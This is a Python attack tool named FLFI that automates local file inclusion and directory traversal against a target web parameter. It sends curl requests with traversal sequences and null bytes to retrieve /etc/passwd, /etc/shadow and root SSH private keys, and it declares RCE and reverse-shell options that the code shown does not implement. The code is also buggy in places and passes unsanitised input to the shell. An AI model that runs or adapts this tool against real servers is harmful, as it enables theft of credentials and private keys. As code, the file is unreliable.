### FLFI - Find Local File Inclusion 
# Joshua Knox aka KNINJA
# Because the K is silent...like a ninja.
# October 2021
###

import argparse
import http.server
import socketserver
import subprocess
import sys
import threading

version = "0.0.1"

# This little class cause the help  text to display if no params are given.
class MyParser(argparse.ArgumentParser):
    def error(self, message):
        print("")
        print("     ______ _      ______ _____ ")
        print("    |  ____| |    |  ____|_   _|")
        print("    | |__  | |    | |__    | |  ")
        print("    |  __| | |    |  __|   | |  ")
        print("    | |    | |____| |     _| |_ ")
        print("    |_|    |______|_|    |_____| verson " + version)
        print("\n      Find Local File Inclusion ")
        sys.stderr.write('\nERROR: %s\n\n' % message)
        self.print_help()
        sys.exit(2)

# Parse CLI parameters:
parser = MyParser()
parser.add_argument('-u', '--url', dest="url", required=True, type=str, \
    help="Provide a target URL. If you are testing specific params please use --param or --params ")

parser.add_argument('-f', '--file', dest="search_file", required=False, type=str, \
    help="File to be searched for, if not specified I will attempt to search from \
        a list of common files")

parser.add_argument('-d', '--param-data', dest="param_data", required=False, type=str, \
    help="Option if you want to define a param. THIS IS NOT NEEDED if you include ?<file>= in your url.")

parser.add_argument('-c', '--check', dest="check_str", required=False, type=str, \
    help="A unique string to help identify success.")

parser.add_argument('--folder', dest="folder", required=False, type=str, \
    help="Add a fold prefix to the traversal.")

parser.add_argument('-A', dest="all_dts", required=False, action='store_true',
    help="Adds uncommon traversal strings.")

parser.add_argument('-P', '--post-only', dest="use_post_only", required=False, action='store_true', \
    help="Chagne HTTP method to ONLY POST (Default is GET)")

parser.add_argument('--post-include', dest="use_post", required=False, action='store_true', \
    help="Chagne HTTP method to INCLUDE POST (Default is GET)")

parser.add_argument('-m', '--max', dest="max_depth", required=False, type=str, \
    help="Sets the max depth of traversal.(Default is 12)")

parser.add_argument('-o', '--print', dest="print_file", required=False, action='store_true',
    help="If files results are found print directly to terminal.")

# parser.add_argument('--apache2-4-49/50', dest="apache2-4-49", required=False, action='store_true',
#     help="Attempts to exploit apache2-4-49/50 CVE-2021-41773/42013")

parser.add_argument('--RCE', dest="rce", required=False, action='store_true',
    help="Will attempt RCE on target. Default is command is 'whoami'")

parser.add_argument('-i', '--ip', dest="host_ip", required=False, type=str, \
    help="Set the local host for RCE")

parser.add_argument('-p', '--port', dest="port", required=False, type=str, \
    help="Port for reverse shell")

# Parse Args put new args ^^ above here! lol 
args = parser.parse_args()

class FLFI:
    def __init__(self, args):
        # ---> SO MANY VARs !! <---
        
        # These are common files to look for and a couple patterns(checks) to verify. 
        self.common_files=[ {
                "name": "/etc/passwd",
                "checks": ["root:x","/bin/bash"],
            },{
                "name": "/etc/profile",
                "checks": ["/etc/profile:", "PATH=" ],
            },{
                "name": "/etc/issue",
                "checks": ["LTS", "Ubuntu"],
            },{
                "name": "/proc/version",
                "checks": ["Linux version"],
            },{
                "name": "/etc/shadow",
                "checks": ["99999:7:::"],
            },{
                "name": "/root/.ssh/id_rsa",
                "checks": ["PRIVATE KEY"],
            }]
        
        # Common Directory Traversal strings:
        self.dts=['../', '....//',]
        # Common and UNCOMMON strings:
        if args.all_dts:
            self.dts=['../', '....//','.%2e/','.%%32%65/']

        # Nullbyte strings:
        self.nbyte = ['','/.','%00']

        # Set VARs from argparse
        self.url = args.url
        self.param_data = args.param_data
        self.folder = args.folder
        self.singular_search_file = args.search_file
        self.singular_search_check = args.check_str
        self.print_file = args.print_file
        self.rce = args.rce
        self.host_ip = args.host_ip 
        self.port = args.port
        self.max_depth=args.max_depth
        self.url = self.clean_url(args.url)
        
        # More VARs
        self.vuln_urls = []
        self.folders_to_check = ['/']
        self.http_methods = ['GET']
        
        if args.use_post_only:
            self.http_methods = ['POST']
        if args.use_post:
            self.http_methods.append['POST']
        if args.folder:
            self.folders_to_check = [ args.folder + '/' ]
        
        # VARs for Current State
        self.curr_url = ""
        self.curr_file = ""
        self.curr_trav_str = ""
        self.curr_null_byte = ""
        self.curr_http_method = ""
        self.curr_post_param = ""

        self.prev_len = 0
        self.curr_len = 0
        self.curr_folder = 0
        self.curr_interation = 0

        # Some helpful checks
        if not self.folder:
            self.folder = ''
        if not self.param_data:
            if "=" in self.url:
                self.param_data = self.url.split("?")[1].replace("=", "")
                self.url = self.url.split("?")[0]
            if "POST" in self.http_methods:
                print("To use the POST method you must provide a param using --param-data or include it in your url. For Example: 10.10.218.27/lab6.php?file=")
        if not self.max_depth:
            self.max_depth = 12
        if self.rce and not self.host_ip:
            print("!! If RCE is set local host (-i or --ip) needs to be set.")
            quit()
        if self.singular_search_file and not self.singular_search_check:
            print("You privide both a search file: -f and a search check: -c if you want to search for a specific file")
            quit()
        if self.singular_search_file and self.singular_search_check:
            self.common_files = [ {
                "name": self.singular_search_file,
                "checks": [self.singular_search_check],}]

    # ---> REAL FUNCTIONS START HERE:

    @staticmethod
    def display_banner():
        print("")
        print("     ______ _      ______ _____ ")
        print("    |  ____| |    |  ____|_   _|")
        print("    | |__  | |    | |__    | |  ")
        print("    |  __| | |    |  __|   | |  ")
        print("    | |    | |____| |     _| |_ ")
        print("    |_|    |______|_|    |_____| verson " + version)
        print("\n      Find Local File Inclusion \n")  
    
    # Check url for http prefix and check for proper format. 
    @staticmethod
    def clean_url(url):
        if url[0:4] != "http":
            url = "http://" + url
        return url

    def construct_url(self):
        if self.param_data:
            param = "?" + self.param_data + "="
        else: 
            param = ""
        url = (self.url + param + '/' + self.curr_folder).replace('//','/') + (self.curr_trav_str * self.curr_interation) + \
            self.curr_file[1:] + self.curr_null_byte
        self.prev_len = self.curr_len
        self.curr_len = len(url)
        return url

    def construct_url_post(self):
        if "?" in self.url:
            url = self.url.split("?")[0]
            if not self.param_data:
                self.param_data = self.url.split("?")[1].replace("=", "")
        url = (self.url + '/' + self.curr_folder).replace('//','/') 
        self.curr_post_param = self.param_data + "=" + (self.curr_trav_str * self.curr_interation) + self.curr_file + self.curr_null_byte
        self.prev_len = self.curr_len
        self.curr_len = len(url + self.curr_post_param + (" " *20))
        return url
    
    def dir_trav_curl(self, f):
        print("\n---> STARTING DIRECTORY TRAVERSAL and NULLBYTE CHECK USING CURL <---\n") 
        self.curr_http_method = "GET"
        for folder in self.folders_to_check:
            for i in range(self.max_depth + 1):
                for sym in self.dts:
                    for nb in self.nbyte:
                        self.curr_folder = folder
                        self.curr_null_byte
                        self.curr_interation = i
                        self.curr_trav_str = sym
                        self.curr_null_byte = nb
                        self.curr_file = f['name']
                        self.curr_url = self.construct_url()
                        print(" " * self.prev_len, end='\r', flush=True)
                        if i == 0:
                            print("[-] TRYING: " + self.curr_url, end='\r', flush=True) 
                            r=subprocess.getoutput("curl -s " + self.curr_url)           
                        else:
                            print("[-] TRYING: " + self.curr_url, end='\r', flush=True) 
                            r=subprocess.getoutput("curl " + self.curr_url)
                        for check in f['checks']:
                            if check in r:
                                print(" " * (self.prev_len + 25), end='\r', flush=True)                  
                                return "Woot!"
        print("DONE" + (" " * (self.prev_len + 20)))
        return 'I got nothing'

    def dir_trav_curl_post(self, f):
        print("\n---> STARTING DIRECTORY TRAVERSAL and NULLBYTE CHECK USING CURL USING POST METHOD <---\n") 
        self.curr_http_method = "POST"
        for folder in self.folders_to_check:
            for i in range(self.max_depth + 1):
                for sym in self.dts:
                    for nb in self.nbyte:
                        self.curr_folder = folder
                        self.curr_null_byte
                        self.curr_interation = i
                        self.curr_trav_str = sym
                        self.curr_null_byte = nb
                        self.curr_file = f['name']
                        self.curr_url = self.construct_url_post()
                        print(" " * self.prev_len, end='\r', flush=True)
                        if i == 0:
                            print('[-] TRYING: curl -s -d "' + self.curr_post_param + '" -X POST ' + self.curr_url, end='\r', flush=True)
                            r=subprocess.getoutput('curl -s -d "' + self.curr_post_param + '" -X POST ' + self.curr_url)           
                        else:
                            print('[-] TRYING: curl -s -d "' + self.curr_post_param + '" -X POST ' + self.curr_url, end='\r', flush=True)
                            r=subprocess.getoutput('curl -s -d "' + self.curr_post_param + '" -X POST ' + self.curr_url) 
                        for check in f['checks']:
                            if check in r:
                                print(" " * (self.prev_len + 25), end='\r', flush=True)                  
                                return "Woot!"
        print("DONE" + (" " * (self.prev_len + 20)))
        return 'I got nothing'
    
    def check_all_files_curl(self):
        for f in self.common_files:
            self.curr_file = f['name']
            self.curr_url = self.construct_url()
            r=subprocess.getoutput("curl -s " + self.curr_url)
            for check in f['checks']:
                if check in r:
                    print("----------------------------------------------------------------------------------")
                    print("[+] FOUND " + self.curr_file + " at: " + self.curr_url)
                    print("----------------------------------------------------------------------------------\n")
                    if self.print_file:
                        print(r)
                    break
        quit()
    
    def check_all_files_curl_post(self):
        for f in self.common_files:
            self.curr_file = f['name']
            self.curr_url  = self.construct_url_post()
            r=subprocess.getoutput('curl -s -d "' + self.curr_post_param + '" -X POST ' + self.curr_url)
            for check in f['checks']:
                if check in r:
                    print("----------------------------------------------------------------------------------")
                    print("[+] FOUND " + self.curr_file + " at: " + self.curr_url + " with POST " + self.curr_post_param)
                    print("----------------------------------------------------------------------------------\n")
                    if self.print_file:
                        print(r)
                    break
        quit()


lfi= FLFI(args)
lfi.display_banner()
for f in lfi.common_files:
    if 'GET' in lfi.http_methods:
        answer = lfi.dir_trav_curl(f)
        if answer != "I got nothing":
            lfi.check_all_files_curl()
    if 'POST' in lfi.http_methods:
        answer = lfi.dir_trav_curl_post(f)
        if answer != "I got nothing":
            lfi.check_all_files_curl_post()